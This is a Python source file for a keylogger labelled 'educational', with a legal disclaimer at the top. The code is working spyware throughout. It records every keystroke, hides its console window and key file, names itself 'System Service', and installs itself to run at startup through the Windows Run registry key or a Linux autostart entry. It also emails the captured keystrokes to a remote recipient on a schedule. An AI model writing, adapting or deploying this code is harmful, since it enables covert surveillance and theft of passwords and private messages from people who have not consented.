#!/usr/bin/env python3
"""
Educational Keylogger - For Learning and Testing Purposes Only

⚠️  LEGAL DISCLAIMER ⚠️
This keylogger is created for educational purposes and ethical testing only.
- Only use on systems you own or have explicit permission to test
- Using this on others' systems without consent is illegal
- The author is not responsible for misuse of this code

Features:
- Keystroke logging with timestamp
- Special key handling (Space, Enter, Backspace, etc.)
- Stealth mode operation
- Log file encryption
- Email reporting capability
- Persistence mechanism
"""

import os
import sys
import time
import logging
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener
import json
import base64
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
import subprocess
import platform

class StealthKeylogger:
    def __init__(self, config_file="config/config.json"):
        """Initialize the keylogger with configuration"""
        self.config_file = config_file
        self.load_config()
        
        # Initialize logging
        self.setup_logging()
        
        # Initialize encryption
        self.setup_encryption()
        
        # Buffer for keystrokes
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Running flag
        self.running = True
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger initialized")
    
    def load_config(self):
        """Load configuration from file"""
        default_config = {
            "log_file": "keylog.txt",
            "encrypted_log_file": "keylog.enc",
            "email": {
                "enabled": False,
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "sender_email": "",
                "sender_password": "",
                "recipient_email": "",
                "send_interval_hours": 24
            },
            "stealth": {
                "hide_console": True,
                "process_name": "System Service",
                "startup_enabled": False
            },
            "logging": {
                "buffer_size": 100,
                "flush_interval_minutes": 5,
                "log_special_keys": True,
                "log_timestamps": True
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    loaded_config = json.load(f)
                    # Merge with defaults
                    self.config = {**default_config, **loaded_config}
            except Exception as e:
                print(f"Error loading config: {e}")
                self.config = default_config
        else:
            self.config = default_config
            self.save_config()
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def setup_logging(self):
        """Setup logging system"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            filename='keylogger_system.log',
            level=logging.INFO,
            format=log_format,
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger(__name__)
    
    def setup_encryption(self):
        """Setup encryption for log files"""
        key_file = "encryption.key"
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.encryption_key = f.read()
        else:
            # Generate new encryption key
            self.encryption_key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.encryption_key)
            
            # Hide the key file on Windows
            if platform.system() == "Windows":
                try:
                    subprocess.run(['attrib', '+H', key_file], check=True)
                except:
                    pass
        
        self.cipher_suite = Fernet(self.encryption_key)
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.encrypt(data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.decrypt(encrypted_data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Decryption error: {e}")
            return encrypted_data
    
    def format_keystroke(self, key):
        """Format keystroke for logging"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') if self.config['logging']['log_timestamps'] else ""
        
        try:
            # Handle special keys
            if key == Key.space:
                return f"[{timestamp}] [SPACE]\n" if self.config['logging']['log_special_keys'] else " "
            elif key == Key.enter:
                return f"[{timestamp}] [ENTER]\n" if self.config['logging']['log_special_keys'] else "\n"
            elif key == Key.backspace:
                return f"[{timestamp}] [BACKSPACE]\n" if self.config['logging']['log_special_keys'] else "[BS]"
            elif key == Key.tab:
                return f"[{timestamp}] [TAB]\n" if self.config['logging']['log_special_keys'] else "\t"
            elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
                return f"[{timestamp}] [SHIFT]\n" if self.config['logging']['log_special_keys'] else ""
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                return f"[{timestamp}] [CTRL]\n" if self.config['logging']['log_special_keys'] else ""
            elif key == Key.alt_l or key == Key.alt_r:
                return f"[{timestamp}] [ALT]\n" if self.config['logging']['log_special_keys'] else ""
            elif hasattr(key, 'char') and key.char is not None:
                # Regular character
                prefix = f"[{timestamp}] " if self.config['logging']['log_timestamps'] else ""
                return f"{prefix}{key.char}"
            else:
                # Other special keys
                key_name = str(key).replace('Key.', '').upper()
                return f"[{timestamp}] [{key_name}]\n" if self.config['logging']['log_special_keys'] else f"[{key_name}]"
                
        except Exception as e:
            self.logger.error(f"Error formatting keystroke: {e}")
            return f"[{timestamp}] [ERROR]\n"
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            formatted_key = self.format_keystroke(key)
            
            with self.buffer_lock:
                self.keystroke_buffer.append(formatted_key)
                
                # Flush buffer if it reaches the configured size
                if len(self.keystroke_buffer) >= self.config['logging']['buffer_size']:
                    self.flush_buffer()
                    
        except Exception as e:
            self.logger.error(f"Error in key press handler: {e}")
    
    def flush_buffer(self):
        """Flush keystroke buffer to file"""
        if not self.keystroke_buffer:
            return
        
        try:
            # Write to plain text log
            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.writelines(self.keystroke_buffer)
            
            # Write to encrypted log
            encrypted_content = self.encrypt_data(''.join(self.keystroke_buffer))
            with open(self.config['encrypted_log_file'], 'a', encoding='utf-8') as f:
                f.write(encrypted_content + '\n')
            
            # Clear buffer
            self.keystroke_buffer.clear()
            
            self.logger.info(f"Buffer flushed - {len(self.keystroke_buffer)} keystrokes logged")
            
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}")
    
    def send_email_report(self):
        """Send email report with logs"""
        if not self.config['email']['enabled']:
            return
        
        try:
            # Read log file
            if not os.path.exists(self.config['log_file']):
                return
            
            with open(self.config['log_file'], 'r', encoding='utf-8') as f:
                log_content = f.read()
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = self.config['email']['sender_email']
            msg['To'] = self.config['email']['recipient_email']
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Email body
            body = f"""
Keylogger Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
System: {platform.system()} {platform.release()}

--- Captured Keystrokes ---
{log_content[-2000:]}  # Last 2000 characters to avoid huge emails
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP(self.config['email']['smtp_server'], self.config['email']['smtp_port'])
            server.starttls()
            server.login(self.config['email']['sender_email'], self.config['email']['sender_password'])
            text = msg.as_string()
            server.sendmail(self.config['email']['sender_email'], self.config['email']['recipient_email'], text)
            server.quit()
            
            self.logger.info("Email report sent successfully")
            
            # Clear log file after sending
            open(self.config['log_file'], 'w').close()
            
        except Exception as e:
            self.logger.error(f"Error sending email report: {e}")
    
    def setup_stealth_mode(self):
        """Setup stealth mode features"""
        if not self.config['stealth']['hide_console']:
            return
        
        try:
            if platform.system() == "Windows":
                import ctypes
                # Hide console window
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception as e:
            self.logger.error(f"Error setting up stealth mode: {e}")
    
    def setup_persistence(self):
        """Setup startup persistence"""
        if not self.config['persistence']['startup_enabled']:
            return
        
        try:
            if platform.system() == "Windows":
                # Add to Windows startup registry
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
            elif platform.system() == "Linux":
                # Add to Linux autostart
                autostart_dir = os.path.expanduser("~/.config/autostart/")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Service
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(os.path.join(autostart_dir, "system-service.desktop"), 'w') as f:
                    f.write(desktop_entry)
            
            self.logger.info("Persistence setup completed")
        except Exception as e:
            self.logger.error(f"Error setting up persistence: {e}")
    
    def schedule_tasks(self):
        """Schedule recurring tasks"""
        # Schedule buffer flushing
        schedule.every(self.config['logging']['flush_interval_minutes']).minutes.do(self.flush_buffer)
        
        # Schedule email reports
        if self.config['email']['enabled']:
            schedule.every(self.config['email']['send_interval_hours']).hours.do(self.send_email_report)
    
    def run_scheduler(self):
        """Run scheduled tasks in background thread"""
        while self.running:
            schedule.run_pending()
            time.sleep(30)  # Check every 30 seconds
    
    def start(self):
        """Start the keylogger"""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting keylogger...")
        
        # Setup stealth mode
        self.setup_stealth_mode()
        
        # Setup persistence
        self.setup_persistence()
        
        # Schedule tasks
        self.schedule_tasks()
        
        # Start scheduler thread
        scheduler_thread = threading.Thread(target=self.run_scheduler, daemon=True)
        scheduler_thread.start()
        
        # Log startup
        self.logger.info("Keylogger started successfully")
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger is running...")
        print("Press Ctrl+C to stop the keylogger")
        
        try:
            # Start listening for keystrokes
            with Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped by user")
            self.stop()
        except Exception as e:
            self.logger.error(f"Error in keylogger: {e}")
            print(f"Error: {e}")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        
        # Flush any remaining buffer
        with self.buffer_lock:
            self.flush_buffer()
        
        self.logger.info("Keylogger stopped")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped")


def main():
    """Main function"""
    print("=" * 60)
    print("Educational Keylogger v1.0")
    print("For Educational and Testing Purposes Only")
    print("=" * 60)
    
    # Create keylogger instance
    keylogger = StealthKeylogger()
    
    # Start keylogger
    keylogger.start()


if __name__ == "__main__":
    main()